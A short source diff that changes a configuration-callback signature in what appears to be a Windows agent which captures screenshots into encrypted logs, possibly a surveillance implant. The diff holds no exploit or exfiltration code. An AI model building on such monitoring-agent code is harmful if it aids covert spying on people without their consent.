@@ -52,7 +52,7 @@ extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 // In BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
-typedef void (WINAPI *conf_callback_t)(JSONObject);
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 extern BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back);
 
 extern aes_context crypt_ctx; // Dichiarata in shared
@@ -147,7 +147,7 @@ void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
 	aes_set_key( &crypt_ctx_conf, crypt_material_conf, KEY_LEN*8 );
 }
 
-void WINAPI ParseGlobalsQuota(JSONObject conf_json)
+void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
 {
 	JSONObject quota = conf_json[L"quota"]->AsObject();
 	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
